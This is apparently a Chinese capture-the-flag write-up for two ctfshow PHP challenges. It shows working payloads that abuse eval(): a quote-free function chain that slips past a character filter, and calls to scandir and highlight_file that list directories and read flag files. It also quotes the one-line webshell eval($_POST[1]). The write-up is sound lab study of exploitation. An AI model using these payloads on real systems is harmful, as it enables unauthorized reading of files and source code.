[[ctfshow_web应用安全与防护核心节点]]

### PHP Code Executor 这题的实战思路

题目首页直接给了一个 PHP 执行框，后端核心逻辑大致是：

```php
if (!preg_match('/^[a-zA-Z0-9();_]+$/', $_POST['code'])) {
    throw new Exception(...);
}
ob_start();
eval($_POST['code']);
$output = ob_get_clean();
echo htmlspecialchars($output);
```

限制点很明确：

- 只能出现字母、数字、下划线、括号、分号
- 不能写引号
- 不能写空格
- 不能写 `$`、`[`、`]`、`.`、`/`、`:`、`'`、`"` 这些常见构造符号

但它还是把输入直接 `eval()` 了，所以只要你能拼出“纯函数调用链”，就已经足够拿文件、看源码、读 flag。

---

### 这题里用到的关键 PHP 函数

#### `phpinfo()`

用途：

- 看 `disable_functions`
- 看 `open_basedir`
- 看 `DOCUMENT_ROOT`
- 看 `SCRIPT_FILENAME`

这题里先用它确认了：

- `disable_functions` 没有禁用
- `open_basedir` 没有限制
- 网站目录是 `/var/www/html`

可直接用：

```php
phpinfo();
```

---

#### `localeconv()`

用途：

- 返回当前区域设置信息数组

这题里它最重要的作用不是看本地化配置，而是“提供一个不需要写字符串字面量的数组”，这样就能继续拿数组元素。

例如：

```php
localeconv();
```

会返回一个数组，其中第一个元素通常是小数点字符串 `"."`。

---

#### `pos()`

用途：

- 取数组当前指针指向的值
- `pos()` 是 `current()` 的别名

这题里非常关键，因为：

- `pos(localeconv())` 可以取到 `"."`
- 这样就等价于拿到了当前目录路径

可直接用：

```php
pos(localeconv());
```

这里返回的就是当前目录 `"."`。

---

#### `scandir()`

用途：

- 列目录

因为 `pos(localeconv())` 可以得到 `"."`，所以这题可以这样列当前目录：

```php
scandir(pos(localeconv()));
```

输出结果是：

```text
Array
(
    [0] => .
    [1] => ..
    [2] => flag.php
    [3] => index.php
)
```

这一步已经足够说明 flag 文件就在当前目录。

---

#### `print_r()`

用途：

- 把数组或变量直接打印出来

这题里主要是配合 `scandir()` 看目录结果：

```php
print_r(scandir(pos(localeconv())));
```

---

#### `array_reverse()`

用途：

- 把数组倒序

原始目录结果是：

- `.`
- `..`
- `flag.php`
- `index.php`

倒序后变成：

- `index.php`
- `flag.php`
- `..`
- `.`

这就方便继续用指针函数取特定文件名。

```php
array_reverse(scandir(pos(localeconv())));
```

---

#### `next()`

用途：

- 把数组内部指针移动到下一个元素，并返回该元素

这题里最关键的一跳是：

```php
next(array_reverse(scandir(pos(localeconv()))));
```

因为倒序后的第一个元素是 `index.php`，第二个元素就是 `flag.php`，所以这句会直接返回：

```text
flag.php
```

---

#### `end()`

用途：

- 把数组指针移动到最后一个元素，并返回它

这题里可以用它验证数组顺序，例如：

```php
end(scandir(pos(localeconv())));
```

会返回：

```text
index.php
```

它本身没直接取到 flag，但能帮助确认目录项位置。

---

#### `readfile()`

用途：

- 直接读取并输出文件内容

这是最后读 flag 的核心函数：

```php
readfile(next(array_reverse(scandir(pos(localeconv())))));
```

逻辑拆开就是：

1. `pos(localeconv())` 取到 `"."`
2. `scandir(.)` 列当前目录
3. `array_reverse(...)` 倒序
4. `next(...)` 取到 `flag.php`
5. `readfile(...)` 直接把文件内容输出

最后读到的是：

```php
<?php
$flag = "CTF{shell_code_base64_bypass}";
```

---

#### `show_source()`

用途：

- 高亮显示 PHP 源码

这题里可以拿来看 `index.php` 的过滤逻辑：

```php
show_source(pos(array_reverse(scandir(pos(localeconv())))));
```

这里倒序后的第一个元素是 `index.php`，所以能直接看到源码，确认过滤正则和 `eval()` 逻辑。

---

### 这题最实用的 payload

#### 看环境

```php
phpinfo();
```

#### 列当前目录

```php
print_r(scandir(pos(localeconv())));
```

#### 取出 `flag.php`

```php
print_r(next(array_reverse(scandir(pos(localeconv())))));
```

#### 直接读 flag

```php
readfile(next(array_reverse(scandir(pos(localeconv())))));
```

---

### 为什么这些函数在这题里特别好用

这题的限制不是“不能执行代码”，而是“不能写常规语法”。

所以思路要从：

- 写字符串
- 拼路径
- 拼变量

切换成：

- 想办法拿现成字符串
- 想办法从数组里取值
- 用函数返回值继续当另一个函数的参数

这就是这条链子的本质：

```php
localeconv() -> pos() -> scandir() -> array_reverse() -> next() -> readfile()
```

整条链完全不需要：

- 引号
- 空格
- 变量
- 拼接符

所以它天然适配这个正则过滤。

---

### 这题和“一句话木马”是什么关系

你说“这题本意好像是一句话木马”，这个判断是有道理的。

从题目包装和 flag 名 `CTF{shell_code_base64_bypass}` 来看，出题人很可能想把思路往下面这类方向引：

- PHP 执行器
- shell code
- base64 bypass
- 用极短 payload 做代码执行
- 想办法做出一个“可继续利用”的一句话木马入口

也就是说，题目气质确实很像“想办法在强过滤下构造一个单行后门”。

但从源码和目录结构看，这题存在一个更短的解法：

- `eval()` 已经给了执行能力
- 当前目录直接能列
- 同目录里直接有 `flag.php`
- 没有 `open_basedir`
- 没有 `disable_functions`

在这种条件下，其实没必要再费劲把它变成一句话木马，因为“一次性文件读取”已经足够到 flag。

换句话说：

- 题目风格像一句话木马题
- 但最短解并不需要真的写出一句话木马

---

### 如果按“一句话木马”的方向去理解，真正考点可能是什么

更像是在考下面这些能力：

- 在几乎没有语法符号的情况下继续调用 PHP 内置函数
- 不写字符串字面量，照样拿到路径和文件名
- 把函数返回值串成利用链
- 用“纯函数表达式”代替常规 WebShell 写法

所以它未必是传统意义上的：

```php
eval($_POST[1]);
```

这种一句话木马题。

更准确地说，它是：

- 受限语法环境下的 PHP 无引号利用链

如果一定要把它归类到“一句话木马”语境里，也更接近：

- 一句话思路
- 不是一句话模板

---

### 这题的核心结论

这题最值得记住的不是某一个 payload，而是这个思路：

1. 先确认有没有真实执行能力
2. 再确认有没有目录/文件读取能力
3. 过滤如果只卡“字符”，就尽量改走“函数返回值链”
4. 能直接读 flag 时，不要过度追求更花的 WebShell 构造

一句话总结：

- 这题表面像“一句话木马 / base64 绕过”
- 实战最短路径其实是“无引号函数链 + 同目录读文件”

---

### 另一类常见题型：`eval($_POST['c'])` 直接执行 PHP 代码

这类题和上面那种“强过滤 PHP 执行器”不同，重点不在无引号构造，而在于：

- 你已经有完整的 PHP 代码执行能力
- 只是部分危险函数可能被 `disable_functions` 禁掉
- 所以优先考虑文件和目录相关函数，而不是先去打命令执行

典型源码：

```php
if(isset($_POST['c'])){
    $c = $_POST['c'];
    eval($c);
}else{
    highlight_file(__FILE__);
}
```

这类题的实战顺序通常是：

1. 先确认当前工作目录
2. 再列根目录或网站目录
3. 确认 flag 文件位置
4. 最后用未被禁用的读文件函数取内容

---

### 这类题里常用的 PHP 函数

#### `getcwd()`

用途：

- 获取当前工作目录

这题里先用它确认 Web 根目录：

```php
echo getcwd();
```

回显通常类似：

```text
/var/www/html
```

这一步能帮你区分：

- flag 在站点目录里
- 还是在根目录、`/tmp`、`/home` 这类位置

---

#### `scandir()`

用途：

- 枚举目录内容

这类题非常实用，因为很多时候 `flag` 不在当前目录，而是在根目录 `/`。

例如直接列根目录：

```php
print_r(scandir("/"));
```

如果输出里出现：

```text
flag.txt
```

那就说明目标文件就在：

```text
/flag.txt
```

---

#### `print_r()`

用途：

- 直接打印数组或变量

一般和 `scandir()` 搭配使用最顺手：

```php
print_r(scandir("/"));
```

也可以用来观察其他函数的返回值结构。

---

#### `highlight_file()`

用途：

- 高亮显示文件内容

很多题里 `system()`、`exec()`、`readfile()`、`file_get_contents()` 会被禁掉，但 `highlight_file()` 常常还活着。

它不只是“看源码函数”，也能直接把普通文本文件内容打出来，所以拿 flag 很顺手：

```php
highlight_file("/flag.txt");
```

如果目标是 PHP 文件，也可以直接看源码：

```php
highlight_file("/var/www/html/index.php");
```

---

### 这道题的最短利用链

#### 先看当前目录

```php
echo getcwd();
```

得到：

```text
/var/www/html
```

#### 再列根目录

```php
print_r(scandir("/"));
```

发现有：

```text
flag.txt
```

#### 最后直接读

```php
highlight_file("/flag.txt");
```

---

### 为什么这题容易卡住

因为很多人看到 `eval()` 后会先想：

- `system("ls")`
- `cat /flag`
- `find / -name flag`

但这类函数经常被禁用。实际上只要 `eval()` 还在，你拿到的是“任意 PHP 代码执行”，不一定非要走 shell。

更稳的思路应该是：

- 先试 `getcwd()`
- 再试 `scandir()`
- 再试 `highlight_file()`
- 最后才考虑 `system()` 之类的系统命令

---

### 这类题的通用找 flag 模板

#### 看当前目录

```php
echo getcwd();
```

#### 列当前目录

```php
print_r(scandir("."));
```

#### 列根目录

```php
print_r(scandir("/"));
```

#### 读源码

```php
highlight_file(__FILE__);
```

#### 读目标文件

```php
highlight_file("/flag.txt");
```

如果 `/flag.txt` 不在，再继续枚举：

- `/var/www/html`
- `/var/www`
- `/tmp`
- `/home`
- `/root`

---

### 这类题的核心结论

遇到 `eval($_POST['x'])` 这种题，第一反应应该是：

- 我拿到的是 PHP 代码执行
- 不是必须依赖系统命令执行

所以优先级通常应当是：

1. `highlight_file(__FILE__)` 看源码
2. `getcwd()` 看站点路径
3. `scandir()` 枚举目录
4. `highlight_file()` 直接读 flag

比起一开始就纠结命令执行函数是否被禁，这条链更短，也更稳定。

### 如果有禁用功能
先跑 `ini_get("disable_functions")` 看黑名单